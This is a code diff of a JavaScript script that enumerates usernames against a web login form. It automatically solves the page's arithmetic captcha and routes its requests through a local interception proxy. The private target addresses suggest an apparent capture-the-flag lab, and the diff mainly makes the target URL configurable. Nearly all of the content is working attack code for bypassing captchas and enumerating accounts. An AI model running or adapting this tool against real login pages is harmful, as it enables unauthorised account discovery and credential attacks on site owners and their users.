@@ -4,11 +4,11 @@ import fetch from 'node-fetch';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import fs from 'fs';
 
-const proxyAgent = new HttpsProxyAgent('http://127.0.0.1:8080');
+const proxyAgent = new HttpsProxyAgent('http://127.0.0.1:8080'); // change to proxy url
+const url = 'http://10.10.0.216/login'  // change to target url
 
 // Read usernames from a file and split them into an array
-const usernamesFileContent = fs.readFileSync('usernames.txt', 'utf-8');
-const usernames = usernamesFileContent.split(/\r?\n/).filter((username) => username.trim() !== '');
+const usernames= fs.readFileSync('usernames.txt', 'utf-8').split(/\r?\n/).filter((username) => username.trim() !== '');
 
 // Function to extract the captcha equation from the response text and evaluate it to get the answer
 function extractCaptchaAnswer(responseText) {
@@ -43,7 +43,7 @@ function extractCaptchaAnswer(responseText) {
 async function performFetchRequest(username) {
   try {
     // Initial request to get the response text
-    const response = await fetch('http://10.10.157.44/login', {
+    const response = await fetch(`${url}`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
@@ -57,7 +57,7 @@ async function performFetchRequest(username) {
     const captchaAnswer = extractCaptchaAnswer(responseText);
     if (captchaAnswer !== null) {
       // Second request with the captcha value
-      const loginResponse = await fetch('http://10.10.157.44/login', {
+      const loginResponse = await fetch(`${url}`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
@@ -81,9 +81,7 @@ async function performFetchRequest(username) {
 // Function to iterate through the list of usernames and make login requests
 async function iterateUsernames() {
   for (const username of usernames) {
-    if (username.trim() !== '') {
 	  await performFetchRequest(username);
-    }
   }
 }
 
